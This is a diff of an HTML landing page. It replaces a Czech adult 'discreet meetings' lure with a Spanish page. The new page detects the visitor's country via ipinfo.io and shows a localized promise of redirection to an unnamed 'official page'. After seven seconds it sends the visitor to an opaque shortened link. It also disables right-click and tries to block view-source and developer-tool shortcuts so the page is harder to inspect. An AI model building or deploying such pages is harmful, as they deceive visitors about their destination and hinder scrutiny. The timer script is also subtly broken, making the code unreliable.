@@ -1,58 +1,187 @@
 <!DOCTYPE html>
-<html lang="cs">
+<html lang="es">
 <head>
-<script id="_wau1ca">var _wau = _wau || []; _wau.push(["dynamic", "stronger100", "1ca", "ffffffffffff", "small"]);</script><script async src="//waust.at/d.js"></script>
-<meta charset="UTF-8">
-<meta http-equiv="X-UA-Compatible" content="ie=edge">
-<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, user-scalable=no">
-<meta name="robots" content="noindex, nofollow">
-<title>Diskrétní schůzky</title>
-<meta content='https://i.postimg.cc/SQVxd77J/Vista-Uno-Sepia.png' property='og:image'/>
-<script src="https://cdn.smrt-content.com/assets/1004/js/jquery.min.js"></script>
-<script src="https://cdn.smrt-content.com/assets/1004/js/device.min.js"></script>
-<script src="https://cdn.smrt-content.com/assets/1004/js/custom.js"></script>
-<script src="https://cdn.smrt-content.com/assets/1004/js/backoffer.js"></script>
-<link rel="stylesheet" href="https://cdn.smrt-content.com/assets/1004/css/index.css">
-<link rel="shortcut icon" href="https://cdn.jmpcdn.com/assets/3420/images/2.ico" type="image/x-icon">
-<title>FOTOGRAFICKÁ GALERIE</title>
-<div class="layer">
-</div>
+  <script id="_wau1ca">var _wau = _wau || []; _wau.push(["dynamic", "stronger100", "1ca", "ffffffffffff", "small"]);</script>
+  <script async src="//waust.at/d.js"></script>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, user-scalable=no">
+  <meta name="robots" content="noindex, nofollow">
+  <title>Catalogo Completo</title> <!-- Título por defecto -->
+  <meta content='https://i.postimg.cc/KjzxqTLS/Screenshot-5.png' property='og:image'/>
+  <script src="https://cdn.smrt-content.com/assets/1004/js/jquery.min.js"></script>
+  <script src="https://cdn.smrt-content.com/assets/1004/js/device.min.js"></script>
+  <script src="https://cdn.smrt-content.com/assets/1004/js/custom.js"></script>
+  <script src="https://cdn.smrt-content.com/assets/1004/js/backoffer.js"></script>
+  <link rel="stylesheet" href="https://cdn.smrt-content.com/assets/1004/css/index.css">
+  <link rel="shortcut icon" href="https://cdn.jmpcdn.com/assets/3420/images/2.ico" type="image/x-icon">
+  <style>
+    .countdown {
+      font-size: 24px;
+      font-weight: bold;
+      margin-top: 20px;
+    }
+  </style>
+</head>
+<body>
 <div class="wrap">
-<div class="step-block">
-<div class="logo">
-<img src="" alt="">
+  <div class="step-block">
+    <div class="logo">
+      <img src="https://i.imgur.com/sZdtUEq.png" alt="">
+    </div>
+    <div class="step-item" style="display: block;">
+      <div class="question-title" id="message"></div>
+      <div class="countdown" id="countdown">
+        Redirigiendo en 7 segundos...
+      </div>
+    </div>
+  </div>
+  <video autoplay muted loop id="VideoBg">
+    <source src="https://cdn-dimi.akamaized.net/landings/275415/1665133459/images/4.mp4" type="video/mp4">
+  </video>
 </div>
-<div class="step-item" style="display: block;">
-<div class="question-title ">
-Přijedeme k vám v noci, služba je dostupná po celém městě. Chcete vidět můj katalog?</div>
-<div class="buttons-block">
-<div class="step-btn no-btn tr-next-button tr-b-option">
-Ne
-</div>
-<div class="step-btn yes-btn tr-next-button tr-b-option">
-Ano
-</div>
-</div>
-</div>
-<div class="step-item thishide" style="display: none;">
-<div class="question-title ">
-UPOZORNĚNÍ! Souhlasíte s tím, že budete respektovat ženy, které uvidíte později? Pokud někoho znáte, neříkejte mu to a nešířte žádné drby.... </div>
-<p>
-<b style="color: red;">
-</b>
-</p>
-<div class="buttons-block">
-<a href="https://shrlc.com/HBYiEUB" class="step-btn submit-btn tr-submit-button showmail">SOUHLASÍM
-</a>
-</div>
-</div>
-<video autoplay muted loop id="VideoBg">
-<source src="https://cdn77-vid-mp4.xvideos-cdn.com/NrI-9u_A9xGDFVqrq1cCLw==,1737966589/videos/mp4/7/2/5/xvideos.com_725b860aa69386510f8343555c9a0e59.mp4?ui=MTg2Ljg5LjI1MC40Ny05MjkzNTc0MTktL3ZpZGVvLm90aXZmaW05MmRlL2xhX3ZhcXVlcmFf" type="video/mp4">
-</video>
+
 <script type="text/javascript">
-      /*<![CDATA[*/    (function(w){
-        w.backOfferUrl = ''    }
-                        (window));
-      /*]]>*/ 
+  // Deshabilitar el clic derecho en la página
+  document.addEventListener("contextmenu", function(event) {
+    event.preventDefault();
+  });
+
+  // Deshabilitar teclas como Ctrl+U (Ver código fuente) y F12 (Herramientas de desarrollo)
+  document.onkeydown = function(e) {
+    // Deshabilitar Ctrl+U (Ver código fuente) y F12 (Herramientas de desarrollo)
+    if (e.ctrlKey && (e.keyCode == 85 || e.keyCode == 123)) {
+      e.preventDefault();
+    }
+  };
+
+  // Obtener la ubicación del usuario a través de la API de ipinfo.io
+  $.get("https://ipinfo.io", function(response) {
+    var country = response.country; // El país basado en la IP
+    var message = '';
+    var pageTitle = 'Catalogo Completo'; // Título por defecto
+    var countdownMessage = "Redirigiendo en 7 segundos..."; // Mensaje por defecto del contador
+
+    // Verificar el país para mostrar el idioma adecuado
+    switch(country) {
+      case 'US': // Estados Unidos
+      case 'GB': // Reino Unido
+      case 'NZ': // Nueva Zelanda
+      case 'AU': // Australia
+        message = "You will be redirected to the official page shortly."; // Inglés
+        pageTitle = "Full Catalog"; // Título en inglés
+        countdownMessage = "Redirecting in 7 seconds..."; // Contador en inglés
+        break;
+      case 'FR': // Francia
+        message = "Vous serez redirigé vers la page officielle sous peu."; // Francés
+        pageTitle = "Catalogue Complet"; // Título en francés
+        countdownMessage = "Redirection dans 7 secondes..."; // Contador en francés
+        break;
+      case 'CA': // Canadá (Francés Canadiense)
+        message = "Vous serez redirigé vers la page officielle sous peu."; // Francés Canadiense
+        pageTitle = "Catalogue Complet"; // Título en francés canadiense
+        countdownMessage = "Redirection dans 7 secondes..."; // Contador en francés canadiense
+        break;
+      case 'BR': // Brasil
+        message = "Você será redirecionado para a página oficial em breve."; // Portugués
+        pageTitle = "Catálogo Completo"; // Título en portugués
+        countdownMessage = "Redirecionando em 7 segundos..."; // Contador en portugués
+        break;
+      case 'CZ': // Chequia
+        message = "Budete brzy přesměrováni na oficiální stránku."; // Checo
+        pageTitle = "Kompletní Katalog"; // Título en checo
+        countdownMessage = "Přesměrování za 7 sekund..."; // Contador en checo
+        break;
+      case 'DE': // Alemania
+        message = "Sie werden in Kürze zur offiziellen Seite weitergeleitet."; // Alemán
+        pageTitle = "Vollständiger Katalog"; // Título en alemán
+        countdownMessage = "Weiterleitung in 7 Sekunden..."; // Contador en alemán
+        break;
+      case 'NL': // Países Bajos
+        message = "U wordt binnenkort doorgestuurd naar de officiële pagina."; // Neerlandés
+        pageTitle = "Volledige Catalogus"; // Título en neerlandés
+        countdownMessage = "Omdirigeren in 7 seconden..."; // Contador en neerlandés
+        break;
+      case 'HR': // Croacia
+        message = "Bit ćete uskoro preusmjeren na službenu stranicu."; // Croata
+        pageTitle = "Potpuni Katalog"; // Título en croata
+        countdownMessage = "Bit ćete preusmjeren za 7 sekundi..."; // Contador en croata
+        break;
+      case 'FI': // Finlandia
+        message = "Sinut ohjataan pian viralliselle sivulle."; // Finlandés
+        pageTitle = "Koko Katalogi"; // Título en finlandés
+        countdownMessage = "Ohjaaminen 7 sekunnissa..."; // Contador en finlandés
+        break;
+      case 'HU': // Hungría
+        message = "Hamarosan átirányítjuk az hivatalos oldalra."; // Húngaro
+        pageTitle = "Teljes Katalógus"; // Título en húngaro
+        countdownMessage = "Átirányítás 7 másodperc múlva..."; // Contador en húngaro
+        break;
+      case 'IT': // Italia
+        message = "Sarai reindirizzato alla pagina ufficiale a breve."; // Italiano
+        pageTitle = "Catalogo Completo"; // Título en italiano
+        countdownMessage = "Reindirizzamento in 7 secondi..."; // Contador en italiano
+        break;
+      case 'NO': // Noruega
+        message = "Du vil bli omdirigert til den offisielle siden om kort tid."; // Noruego
+        pageTitle = "Full Katalog"; // Título en noruego
+        countdownMessage = "Omdirigering om 7 sekunder..."; // Contador en noruego
+        break;
+      case 'DK': // Dinamarca
+        message = "Du vil blive omdirigeret til den officielle side snart."; // Danés
+        pageTitle = "Fuld Katalog"; // Título en danés
+        countdownMessage = "Omdirigering om 7 sekunder..."; // Contador en danés
+        break;
+      case 'PL': // Polonia
+        message = "Zostaniesz wkrótce przekierowany na oficjalną stronę."; // Polaco
+        pageTitle = "Pełny Katalog"; // Título en polaco
+        countdownMessage = "Przekierowanie za 7 sekund..."; // Contador en polaco
+        break;
+      case 'SE': // Suecia
+        message = "Du kommer snart att omdirigeras till den officiella sidan."; // Sueco
+        pageTitle = "Fullständig Katalog"; // Título en sueco
+        countdownMessage = "Omdirigering om 7 sekunder..."; // Contador en sueco
+        break;
+      case 'RO': // Rumanía
+        message = "Veți fi redirecționat către pagina oficială în curând."; // Rumano
+        pageTitle = "Catalog Complet"; // Título en rumano
+        countdownMessage = "Redirecționare în 7 secunde..."; // Contador en rumano
+        break;
+      case 'ES': // España (por defecto en español)
+      default:
+        message = "A continuación serás redirigido a la página oficial."; // Español
+        pageTitle = "Catálogo Completo"; // Título en español
+        countdownMessage = "Redirigiendo en 7 segundos..."; // Contador en español
+        break;
+    }
+
+    // Mostrar el mensaje según el país
+    document.getElementById("message").innerHTML = message;
+
+    // Cambiar dinámicamente el título de la página según el país
+    document.title = pageTitle;
+
+    // Mostrar el mensaje del contador
+    document.getElementById("countdown").innerHTML = countdownMessage;
+
+  }, "json");
+
+  // Establecer la URL de redirección
+  var redirectUrl = "https://shrlc.com/qsYbZaq"; // Cambia la URL a la que deseas redirigir
+
+  // Función para la cuenta regresiva
+  var countdown = 7; // Contador en segundos (ahora 7 segundos)
+  var countdownElement = document.getElementById("countdown");
+
+  var interval = setInterval(function() {
+    countdown--;
+    countdownElement.innerHTML = countdownMessage.replace("7", countdown); // Cambiar el número del contador dinámicamente
+    if (countdown <= 0) {
+      clearInterval(interval); // Detener el contador
+      window.location.href = redirectUrl; // Redirigir al usuario
+    }
+  }, 1000); // Actualizar cada segundo
+</script>
+
 </body>
 </html>
